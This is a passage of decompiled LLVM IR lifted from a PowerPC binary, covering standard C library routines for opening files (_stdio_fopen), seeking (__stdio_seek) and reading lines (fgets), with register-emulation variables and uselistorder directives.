dec_label_pc_10013f4c:                            ; preds = %dec_label_pc_10013f44
  %v0_10013f4c = call i32 @__errno_location()
  %v2_10013f54 = inttoptr i32 %v0_10013f4c to i32*
  store i32 75, i32* %v2_10013f54, align 4
  %v0_10013f64.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f60

dec_label_pc_10013f5c:                            ; preds = %dec_label_pc_10013eb8, %dec_label_pc_10013eb0
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10013f60

dec_label_pc_10013f60:                            ; preds = %dec_label_pc_10013f44, %dec_label_pc_10013f4c, %dec_label_pc_10013f5c
  %v0_10013f64 = phi i32 [ %v0_10013f44, %dec_label_pc_10013f44 ], [ %v0_10013f64.pre, %dec_label_pc_10013f4c ], [ -1, %dec_label_pc_10013f5c ]
  ret i32 %v0_10013f64

; uselistorder directives
  uselistorder i32 %v2_10013f24, { 1, 0 }
  uselistorder i32 %v2_10013f08, { 0, 2, 3, 1, 4 }
  uselistorder i16 %tmp9, { 1, 0 }
  uselistorder i32 %tmp, { 5, 0, 1, 3, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 2048, { 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_10013f60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013f44thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10013ee4, { 4, 0, 1, 2, 3 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10013f78 = load i32, i32* @lr, align 4
  store i32 %v0_10013f78, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10013f8c = load i32, i32* @r5, align 4
  store i32 %v0_10013f8c, i32* @r31, align 4
  %v0_10013f90 = load i32, i32* @r6, align 4
  store i32 %v0_10013f90, i32* @r29, align 4
  %v3_10013f94 = load i8, i8* %arg2, align 1
  %v4_10013f94 = zext i8 %v3_10013f94 to i32
  store i32 %v4_10013f94, i32* %r0.global-to-local, align 4
  %v3_10013f98 = icmp eq i8 %v3_10013f94, 114
  br i1 %v3_10013f98, label %dec_label_pc_10013fe4, label %dec_label_pc_10013fa0

dec_label_pc_10013fa0:                            ; preds = %entry
  %v3_10013fa0 = icmp eq i8 %v3_10013f94, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_10013fa0, label %dec_label_pc_10013fe8, label %dec_label_pc_10013fac

dec_label_pc_10013fac:                            ; preds = %dec_label_pc_10013fa0
  %v3_10013fac = icmp eq i8 %v3_10013f94, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10013fac, label %dec_label_pc_10013fe8, label %dec_label_pc_10013fb8

dec_label_pc_10013fb8:                            ; preds = %dec_label_pc_10014078, %dec_label_pc_10014048, %dec_label_pc_10013fac
  %v0_10013fb8 = call i32 @__errno_location()
  %v0_10013fbc = load i32, i32* @r31, align 4
  %v3_10013fbc = icmp eq i32 %v0_10013fbc, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10013fc4 = inttoptr i32 %v0_10013fb8 to i32*
  store i32 22, i32* %v2_10013fc4, align 4
  br i1 %v3_10013fbc, label %dec_label_pc_10014218, label %dec_label_pc_10013fcc

dec_label_pc_10013fcc:                            ; preds = %dec_label_pc_100140ac, %dec_label_pc_10013fb8
  %v0_10013fcc = load i32, i32* @r31, align 4
  %v1_10013fcc = inttoptr i32 %v0_10013fcc to i16*
  %v2_10013fcc = load i16, i16* %v1_10013fcc, align 2
  %v3_10013fcc = zext i16 %v2_10013fcc to i32
  store i32 %v3_10013fcc, i32* %r0.global-to-local, align 4
  %v1_10013fd0 = and i32 %v3_10013fcc, 8192
  store i32 %v1_10013fd0, i32* %r9.global-to-local, align 4
  %v3_10013fd0 = icmp eq i32 %v1_10013fd0, 0
  store i1 %v3_10013fd0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10013fd0, label %dec_label_pc_10014218, label %dec_label_pc_10013fd8

dec_label_pc_10013fd8:                            ; preds = %dec_label_pc_10013fcc
  store i32 ptrtoint (i32* @global_var_10013fe0.1163 to i32), i32* @lr, align 4
  %v2_10013fdc = call i32 @free(i32 %v0_10013fcc)
  br label %dec_label_pc_10014218

dec_label_pc_10013fe4:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10013fe8

dec_label_pc_10013fe8:                            ; preds = %dec_label_pc_10013fac, %dec_label_pc_10013fa0, %dec_label_pc_10013fe4
  %v0_10014008 = phi i32 [ 1089, %dec_label_pc_10013fac ], [ 577, %dec_label_pc_10013fa0 ], [ 1, %dec_label_pc_10013fe4 ]
  %v2_10013fe8 = add i32 %tmp, 1
  %v3_10013fe8 = inttoptr i32 %v2_10013fe8 to i8*
  %v4_10013fe8 = load i8, i8* %v3_10013fe8, align 1
  %v5_10013fe8 = zext i8 %v4_10013fe8 to i32
  store i32 %v5_10013fe8, i32* %r0.global-to-local, align 4
  %v3_10013ff0 = icmp eq i8 %v4_10013fe8, 98
  br i1 %v3_10013ff0, label %dec_label_pc_10013ffc, label %dec_label_pc_10013ff8

dec_label_pc_10013ff8:                            ; preds = %dec_label_pc_10013fe8
  br label %dec_label_pc_10013ffc

dec_label_pc_10013ffc:                            ; preds = %dec_label_pc_10013fe8, %dec_label_pc_10013ff8
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10013ff8 ], [ %v2_10013fe8, %dec_label_pc_10013fe8 ]
  %v0_10013ffc = phi i32 [ %tmp, %dec_label_pc_10013ff8 ], [ %v2_10013fe8, %dec_label_pc_10013fe8 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10013ffc = add i32 %v0_10013ffc, 1
  %v2_10013ffc = inttoptr i32 %v1_10013ffc to i8*
  %v3_10013ffc = load i8, i8* %v2_10013ffc, align 1
  %v4_10013ffc = zext i8 %v3_10013ffc to i32
  store i32 %v4_10013ffc, i32* %r0.global-to-local, align 4
  %v3_10014000 = icmp eq i8 %v3_10013ffc, 43
  br i1 %v3_10014000, label %dec_label_pc_10014008, label %dec_label_pc_10014010

dec_label_pc_10014008:                            ; preds = %dec_label_pc_10013ffc
  store i32 %v0_10014008, i32* %r9.global-to-local, align 4
  %v1_1001400c = add nuw nsw i32 %v0_10014008, 1
  store i32 %v1_1001400c, i32* @r28, align 4
  br label %dec_label_pc_10014010

dec_label_pc_10014010:                            ; preds = %dec_label_pc_10013ffc, %dec_label_pc_10014008
  %v3_10014010 = icmp eq i32 %v0_10013f8c, 0
  br i1 %v3_10014010, label %dec_label_pc_10014018, label %dec_label_pc_10014040

dec_label_pc_10014018:                            ; preds = %dec_label_pc_10014010
  store i32 268517408, i32* @lr, align 4
  %v1_1001401c = call i32 @malloc(i32 80)
  store i32 %v1_1001401c, i32* @r31, align 4
  %v4_10014020 = icmp eq i32 %v1_1001401c, 0
  store i1 %v4_10014020, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_10014020, label %dec_label_pc_1001421c, label %dec_label_pc_10014028

dec_label_pc_10014028:                            ; preds = %dec_label_pc_10014018
  %v1_1001402c = add i32 %v1_1001401c, 56
  store i32 %v1_1001402c, i32* @r3, align 4
  %v3_10014030 = inttoptr i32 %v1_1001401c to i16*
  store i16 8192, i16* %v3_10014030, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014038 = load i32, i32* @r31, align 4
  %v2_10014038 = add i32 %v1_10014038, 8
  %v3_10014038 = inttoptr i32 %v2_10014038 to i32*
  store i32 0, i32* %v3_10014038, align 4
  store i32 268517440, i32* @lr, align 4
  %v0_1001403c = call i32 @__stdio_init_mutex()
  %v0_10014040.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10014040

dec_label_pc_10014040:                            ; preds = %dec_label_pc_10014010, %dec_label_pc_10014028
  %v0_100140a0 = phi i32 [ %v0_10013f90, %dec_label_pc_10014010 ], [ %v0_10014040.pre, %dec_label_pc_10014028 ]
  %v1_10014040 = icmp slt i32 %v0_100140a0, 0
  br i1 %v1_10014040, label %dec_label_pc_100140a0, label %dec_label_pc_10014048

dec_label_pc_10014048:                            ; preds = %dec_label_pc_10014040
  %v1_1001404c = add i32 %arg1, 1
  store i32 %v1_1001404c, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10014054 = load i32, i32* @r31, align 4
  %v2_10014054 = add i32 %v1_10014054, 4
  %v3_10014054 = inttoptr i32 %v2_10014054 to i32*
  store i32 %v0_100140a0, i32* %v3_10014054, align 4
  %v0_10014058 = load i32, i32* @r28, align 4
  %v1_10014058 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014058 = and i32 %v1_10014058, %v0_10014058
  %v1_1001405c = add i32 %v2_10014058, 1
  store i32 %v1_1001405c, i32* %r9.global-to-local, align 4
  %v1_10014060 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014060 = and i32 %v1_10014060, %v1_1001405c
  store i32 %v2_10014060, i32* %r0.global-to-local, align 4
  %v4_10014064 = icmp eq i32 %v2_10014060, %v1_1001405c
  br i1 %v4_10014064, label %dec_label_pc_1001406c, label %dec_label_pc_10013fb8

dec_label_pc_1001406c:                            ; preds = %dec_label_pc_10014048
  %v2_1001406c = sub i32 -1, %arg1
  %v3_1001406c = and i32 %v0_10014058, %v2_1001406c
  store i32 %v3_1001406c, i32* %r0.global-to-local, align 4
  %v1_10014070 = and i32 %v3_1001406c, 1024
  store i32 %v1_10014070, i32* %r9.global-to-local, align 4
  %v3_10014070 = icmp eq i32 %v1_10014070, 0
  store i1 %v3_10014070, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10014070, label %dec_label_pc_10014094, label %dec_label_pc_10014078

dec_label_pc_10014078:                            ; preds = %dec_label_pc_1001406c
  %v0_10014078 = load i32, i32* @r29, align 4
  store i32 268517516, i32* @lr, align 4
  %v2_10014088 = call i32 @__libc_fcntl(i32 %v0_10014078, i32 4)
  %v3_1001408c = icmp eq i32 %v2_10014088, 0
  br i1 %v3_1001408c, label %dec_label_pc_10014094, label %dec_label_pc_10013fb8

dec_label_pc_10014094:                            ; preds = %dec_label_pc_10014078, %dec_label_pc_1001406c
  %v1_10014094 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10014094, i32* %r0.global-to-local, align 4
  %v0_10014098 = load i32, i32* @r28, align 4
  %v2_10014098 = or i32 %v0_10014098, %v1_10014094
  store i32 %v2_10014098, i32* @r28, align 4
  br label %dec_label_pc_100140cc

dec_label_pc_100140a0:                            ; preds = %dec_label_pc_10014040
  %v3_100140a0 = icmp eq i32 %v0_100140a0, -1
  %v0_100140b0.pre = load i32, i32* @r28, align 4
  br i1 %v3_100140a0, label %dec_label_pc_100140ac, label %dec_label_pc_100140a8

dec_label_pc_100140a8:                            ; preds = %dec_label_pc_100140a0
  %v1_100140a8 = or i32 %v0_100140b0.pre, 65536
  store i32 %v1_100140a8, i32* @r28, align 4
  br label %dec_label_pc_100140ac

dec_label_pc_100140ac:                            ; preds = %dec_label_pc_100140a0, %dec_label_pc_100140a8
  %v0_100140b0 = phi i32 [ %v1_100140a8, %dec_label_pc_100140a8 ], [ %v0_100140b0.pre, %dec_label_pc_100140a0 ]
  store i32 438, i32* @r5, align 4
  store i32 268517568, i32* @lr, align 4
  %v2_100140bc = call i32 @__libc_open(i32 %arg1, i32 %v0_100140b0)
  %v1_100140c0 = icmp slt i32 %v2_100140bc, 0
  %v1_100140c4 = load i32, i32* @r31, align 4
  %v2_100140c4 = add i32 %v1_100140c4, 4
  %v3_100140c4 = inttoptr i32 %v2_100140c4 to i32*
  store i32 %v2_100140bc, i32* %v3_100140c4, align 4
  br i1 %v1_100140c0, label %dec_label_pc_10013fcc, label %dec_label_pc_100140ac.dec_label_pc_100140cc_crit_edge

dec_label_pc_100140ac.dec_label_pc_100140cc_crit_edge: ; preds = %dec_label_pc_100140ac
  %v0_100140d0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100140cc

dec_label_pc_100140cc:                            ; preds = %dec_label_pc_100140ac.dec_label_pc_100140cc_crit_edge, %dec_label_pc_10014094
  %v0_100140d0 = phi i32 [ %v0_100140d0.pre, %dec_label_pc_100140ac.dec_label_pc_100140cc_crit_edge ], [ %v2_10014098, %dec_label_pc_10014094 ]
  %v0_100140cc = load i32, i32* @r31, align 4
  %v1_100140cc = inttoptr i32 %v0_100140cc to i16*
  %v2_100140cc = load i16, i16* %v1_100140cc, align 2
  %v3_100140cc = zext i16 %v2_100140cc to i32
  store i32 %v3_100140cc, i32* %r0.global-to-local, align 4
  %v1_100140d0 = urem i32 %v0_100140d0, 4
  store i32 %v1_100140d0, i32* %r29.global-to-local, align 4
  %v1_100140d4 = call i32 @__asm_rlwinm(i32 %v0_100140d0, i32 0, i32 21, i32 21)
  %v1_100140d8 = add nuw nsw i32 %v1_100140d0, 1
  store i32 %v1_100140d8, i32* %r29.global-to-local, align 4
  %v1_100140dc = call i32 @__asm_rlwinm(i32 %v3_100140cc, i32 0, i32 18, i32 18)
  store i32 %v1_100140dc, i32* %r0.global-to-local, align 4
  %v1_100140e0 = xor i32 %v1_100140d8, 3
  store i32 %v1_100140e0, i32* %r29.global-to-local, align 4
  %v1_100140e4 = urem i32 %v1_100140dc, 65536
  store i32 %v1_100140e4, i32* %r9.global-to-local, align 4
  %v0_100140e8 = load i32, i32* @r28, align 4
  %v1_100140e8 = call i32 @__asm_rlwinm(i32 %v0_100140e8, i32 31, i32 16, i32 16)
  %v2_100140ec = or i32 %v1_100140e8, %v1_100140d4
  store i32 %v2_100140ec, i32* %r0.global-to-local, align 4
  %v0_100140f0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100140f0 = mul i32 %v0_100140f0, 16
  %v0_100140f4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100140f4 = or i32 %v0_100140f4, %v2_100140ec
  store i32 %v2_100140f4, i32* %r9.global-to-local, align 4
  %v2_100140f8 = or i32 %v2_100140f4, %v1_100140f0
  store i32 %v2_100140f8, i32* @r29, align 4
  %v1_100140fc = trunc i32 %v2_100140f8 to i16
  %v2_100140fc = load i32, i32* @r31, align 4
  %v3_100140fc = inttoptr i32 %v2_100140fc to i16*
  store i16 %v1_100140fc, i16* %v3_100140fc, align 2
  %v0_10014100 = call i32 @__errno_location()
  store i32 %v0_10014100, i32* @r28, align 4
  %v0_10014108 = load i32, i32* @r31, align 4
  %v1_10014108 = add i32 %v0_10014108, 4
  %v2_10014108 = inttoptr i32 %v1_10014108 to i32*
  %v3_10014108 = load i32, i32* %v2_10014108, align 4
  %v1_1001410c = inttoptr i32 %v0_10014100 to i32*
  %v2_1001410c = load i32, i32* %v1_1001410c, align 4
  store i32 %v2_1001410c, i32* @r27, align 4
  store i32 268517652, i32* @lr, align 4
  %v1_10014110 = call i32 @isatty(i32 %v3_10014108)
  %v1_10014114 = mul i32 %v1_10014110, 256
  %v0_10014118 = load i32, i32* @r29, align 4
  %v2_10014118 = or i32 %v0_10014118, %v1_10014114
  store i32 %v2_10014118, i32* @r29, align 4
  %v1_1001411c = trunc i32 %v2_10014118 to i16
  %v2_1001411c = load i32, i32* @r31, align 4
  %v3_1001411c = inttoptr i32 %v2_1001411c to i16*
  store i16 %v1_1001411c, i16* %v3_1001411c, align 2
  %v0_10014120 = load i32, i32* @r27, align 4
  %v1_10014120 = load i32, i32* @r28, align 4
  %v2_10014120 = inttoptr i32 %v1_10014120 to i32*
  store i32 %v0_10014120, i32* %v2_10014120, align 4
  %v0_10014124 = load i32, i32* @r31, align 4
  %v1_10014124 = add i32 %v0_10014124, 8
  %v2_10014124 = inttoptr i32 %v1_10014124 to i32*
  %v3_10014124 = load i32, i32* %v2_10014124, align 4
  store i32 %v3_10014124, i32* %r0.global-to-local, align 4
  %v3_10014128 = icmp eq i32 %v3_10014124, 0
  br i1 %v3_10014128, label %dec_label_pc_10014130, label %dec_label_pc_10014160

dec_label_pc_10014130:                            ; preds = %dec_label_pc_100140cc
  store i32 268517688, i32* @lr, align 4
  %v1_10014134 = call i32 @malloc(i32 4096)
  %v3_10014138 = icmp eq i32 %v1_10014134, 0
  %v1_1001413c = load i32, i32* @r31, align 4
  %v2_1001413c = add i32 %v1_1001413c, 8
  %v3_1001413c = inttoptr i32 %v2_1001413c to i32*
  store i32 %v1_10014134, i32* %v3_1001413c, align 4
  %v1_1001415c = load i32, i32* @r31, align 4
  br i1 %v3_10014138, label %dec_label_pc_1001415c, label %dec_label_pc_10014144

dec_label_pc_10014144:                            ; preds = %dec_label_pc_10014130
  %v1_10014144 = inttoptr i32 %v1_1001415c to i16*
  %v2_10014144 = load i16, i16* %v1_10014144, align 2
  %v3_10014144 = zext i16 %v2_10014144 to i32
  store i32 %v3_10014144, i32* %r0.global-to-local, align 4
  %v1_10014148 = add i32 %v1_10014134, 4096
  store i32 %v1_10014148, i32* %r9.global-to-local, align 4
  %v2_1001414c = add i32 %v1_1001415c, 12
  %v3_1001414c = inttoptr i32 %v2_1001414c to i32*
  store i32 %v1_10014148, i32* %v3_1001414c, align 4
  %v0_10014150 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014150 = or i32 %v0_10014150, 16384
  store i32 %v1_10014150, i32* %r0.global-to-local, align 4
  %v1_10014154 = trunc i32 %v1_10014150 to i16
  %v2_10014154 = load i32, i32* @r31, align 4
  %v3_10014154 = inttoptr i32 %v2_10014154 to i16*
  store i16 %v1_10014154, i16* %v3_10014154, align 2
  br label %dec_label_pc_10014160

dec_label_pc_1001415c:                            ; preds = %dec_label_pc_10014130
  %v2_1001415c = add i32 %v1_1001415c, 12
  %v3_1001415c = inttoptr i32 %v2_1001415c to i32*
  store i32 0, i32* %v3_1001415c, align 4
  br label %dec_label_pc_10014160

dec_label_pc_10014160:                            ; preds = %dec_label_pc_100140cc, %dec_label_pc_10014144, %dec_label_pc_1001415c
  %v0_10014160 = load i32, i32* @r31, align 4
  %v1_10014160 = inttoptr i32 %v0_10014160 to i16*
  %v2_10014160 = load i16, i16* %v1_10014160, align 2
  %v3_10014160 = zext i16 %v2_10014160 to i32
  store i32 %v3_10014160, i32* %r0.global-to-local, align 4
  %v1_10014164 = add i32 %v0_10014160, 8
  %v2_10014164 = inttoptr i32 %v1_10014164 to i32*
  %v3_10014164 = load i32, i32* %v2_10014164, align 4
  store i32 %v3_10014164, i32* %r9.global-to-local, align 4
  %v1_10014168 = and i32 %v3_10014160, 8192
  %v3_10014168 = icmp eq i32 %v1_10014168, 0
  store i1 %v3_10014168, i1* %cr0_eq.global-to-local, align 1
  %v3_10014170 = add i32 %v0_10014160, 2
  %v4_10014170 = inttoptr i32 %v3_10014170 to i8*
  store i8 0, i8* %v4_10014170, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10014178 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014178 = load i32, i32* @r31, align 4
  %v2_10014178 = add i32 %v1_10014178, 20
  %v3_10014178 = inttoptr i32 %v2_10014178 to i32*
  store i32 %v0_10014178, i32* %v3_10014178, align 4
  %v0_1001417c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001417c = load i32, i32* @r31, align 4
  %v2_1001417c = add i32 %v1_1001417c, 24
  %v3_1001417c = inttoptr i32 %v2_1001417c to i32*
  store i32 %v0_1001417c, i32* %v3_1001417c, align 4
  %v0_10014180 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014180 = load i32, i32* @r31, align 4
  %v2_10014180 = add i32 %v1_10014180, 28
  %v3_10014180 = inttoptr i32 %v2_10014180 to i32*
  store i32 %v0_10014180, i32* %v3_10014180, align 4
  %v0_10014184 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014184 = load i32, i32* @r31, align 4
  %v2_10014184 = add i32 %v1_10014184, 16
  %v3_10014184 = inttoptr i32 %v2_10014184 to i32*
  store i32 %v0_10014184, i32* %v3_10014184, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v0_1001418c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001418c = load i32, i32* @r31, align 4
  %v2_1001418c = add i32 %v1_1001418c, 44
  %v3_1001418c = inttoptr i32 %v2_1001418c to i32*
  store i32 %v0_1001418c, i32* %v3_1001418c, align 4
  %v3_10014190 = load i32, i32* @global_var_1002c8cc.1164, align 4
  store i32 %v3_10014190, i32* %r0.global-to-local, align 4
  %v1_10014194 = load i32, i32* @r31, align 4
  %v2_10014194 = add i32 %v1_10014194, 52
  %v3_10014194 = inttoptr i32 %v2_10014194 to i32*
  store i32 %v3_10014190, i32* %v3_10014194, align 4
  %v0_10014198 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10014198, label %dec_label_pc_1001421c, label %dec_label_pc_1001419c

dec_label_pc_1001419c:                            ; preds = %dec_label_pc_10014160
  store i32 ptrtoint ([3 x i8]* @global_var_10011758.1042 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002c580.1040 to i32), i32* %r29.global-to-local, align 4
  %v2_100141ac = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100141ac, i32* @r26, align 4
  store i32 %v2_100141ac, i32* @r3, align 4
  %v0_100141bc = call i32 @__pthread_return_void()
  %v2_100141c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100141c8, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002c568.1039 to i32), i32* @r29, align 4
  %v0_100141d0 = call i32 @__pthread_return_0()
  store i32 %v2_100141c8, i32* @r3, align 4
  %v0_100141e0 = call i32 @__pthread_return_void()
  %v0_100141e8 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_100141f0 = load i32, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  store i32 %v3_100141f0, i32* %r0.global-to-local, align 4
  store i32 %v2_100141c8, i32* @r3, align 4
  %v1_100141fc = load i32, i32* @r31, align 4
  %v2_100141fc = add i32 %v1_100141fc, 32
  %v3_100141fc = inttoptr i32 %v2_100141fc to i32*
  store i32 %v3_100141f0, i32* %v3_100141fc, align 4
  %v0_10014200 = load i32, i32* @r31, align 4
  store i32 %v0_10014200, i32* bitcast (i32** @global_var_1002c8c8.1041 to i32*), align 4
  %v0_10014204 = call i32 @__pthread_return_void()
  store i32 %v2_100141ac, i32* @r3, align 4
  %v0_10014210 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1001421c

dec_label_pc_10014218:                            ; preds = %dec_label_pc_10013fcc, %dec_label_pc_10013fb8, %dec_label_pc_10013fd8
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1001421c

dec_label_pc_1001421c:                            ; preds = %dec_label_pc_10014160, %dec_label_pc_10014018, %dec_label_pc_1001419c, %dec_label_pc_10014218
  store i32 %v0_10013f78, i32* %r0.global-to-local, align 4
  %v0_10014220 = load i32, i32* @r31, align 4
  ret i32 %v0_10014220

; uselistorder directives
  uselistorder i32 %v1_1001415c, { 2, 0, 1 }
  uselistorder i32 %v0_100140d0, { 1, 0 }
  uselistorder i32 %v1_1001401c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10014008, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 4096, { 13, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 (i32)* @isatty, { 2, 0, 1 }
  uselistorder i32 21, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_open, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 0, 9, 8, 7, 6, 11, 10, 5, 4, 3, 2 }
  uselistorder i32 1024, { 9, 10, 11, 12, 0, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__stdio_init_mutex, { 3, 2, 1, 0, 4 }
  uselistorder i32 56, { 3, 4, 6, 5, 0, 1, 2 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 22, { 2, 14, 3, 15, 11, 4, 12, 5, 6, 17, 7, 18, 8, 16, 9, 10, 0, 1, 13 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001421c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10014218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014160, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100140ac, { 1, 0 }
  uselistorder label %dec_label_pc_10014040, { 1, 0 }
  uselistorder label %dec_label_pc_10014010, { 1, 0 }
  uselistorder label %dec_label_pc_10013ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10013fe8, { 2, 0, 1 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10014234 = load i32, i32* @lr, align 4
  store i32 %v0_10014234, i32* %r0.global-to-local, align 4
  %v0_10014240 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_1001424c = add i32 %arg1, 4
  %v2_1001424c = inttoptr i32 %v1_1001424c to i32*
  %v3_1001424c = load i32, i32* %v2_1001424c, align 4
  %v2_10014250 = load i32, i32* %arg2, align 4
  %v1_10014254 = add i32 %tmp, 4
  %v2_10014254 = inttoptr i32 %v1_10014254 to i32*
  %v3_10014254 = load i32, i32* %v2_10014254, align 4
  store i32 268517980, i32* @lr, align 4
  %v4_10014258 = call i32 @__libc_lseek64(i32 %v3_1001424c, i32 %v2_10014250, i32 %v3_10014254, i32 %arg3)
  %v1_1001425c = icmp slt i32 %v4_10014258, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_1001425c, label %dec_label_pc_10014274, label %dec_label_pc_10014268

dec_label_pc_10014268:                            ; preds = %entry
  %v1_10014268 = load i32, i32* @r31, align 4
  %v2_10014268 = inttoptr i32 %v1_10014268 to i32*
  store i32 %v4_10014258, i32* %v2_10014268, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10014270 = load i32, i32* @r31, align 4
  %v2_10014270 = add i32 %v1_10014270, 4
  %v3_10014270 = inttoptr i32 %v2_10014270 to i32*
  store i32 %tmp, i32* %v3_10014270, align 4
  %v0_10014274.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10014274

dec_label_pc_10014274:                            ; preds = %entry, %dec_label_pc_10014268
  %v0_10014274 = phi i32 [ %tmp, %entry ], [ %v0_10014274.pre, %dec_label_pc_10014268 ]
  store i32 %v0_10014234, i32* %r0.global-to-local, align 4
  store i32 %v0_10014240, i32* @r31, align 4
  ret i32 %v0_10014274

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_10014274, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10014294 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10014294, i32* %r28.global-to-local, align 4
  %v1_100142b8 = add i32 %arg3, 52
  %v2_100142b8 = inttoptr i32 %v1_100142b8 to i32*
  %v3_100142b8 = load i32, i32* %v2_100142b8, align 4
  %v2_100142bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100142bc, i32* @r3, align 4
  %v3_100142c8 = icmp eq i32 %v3_100142b8, 0
  store i1 %v3_100142c8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100142c8, label %dec_label_pc_100142d0, label %dec_label_pc_100142dc

dec_label_pc_100142d0:                            ; preds = %entry
  %v0_100142d0 = call i32 @__pthread_return_void()
  %v0_100142d8 = call i32 @__pthread_return_0()
  %v0_100142dc.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100142e0.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100142e4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100142dc

dec_label_pc_100142dc:                            ; preds = %entry, %dec_label_pc_100142d0
  %v0_100142e4 = phi i32 [ %v0_10014294, %entry ], [ %v0_100142e4.pre, %dec_label_pc_100142d0 ]
  %v0_100142e0 = phi i32 [ %arg3, %entry ], [ %v0_100142e0.pre, %dec_label_pc_100142d0 ]
  %v0_100142dc = phi i32 [ %arg2, %entry ], [ %v0_100142dc.pre, %dec_label_pc_100142d0 ]
  store i32 268518124, i32* @lr, align 4
  %v3_100142e8 = inttoptr i32 %v0_100142e4 to i8*
  %v4_100142e8 = call i32 @__GI_fgets_unlocked(i8* %v3_100142e8, i32 %v0_100142dc, i32 %v0_100142e0)
  store i32 %v4_100142e8, i32* @r31, align 4
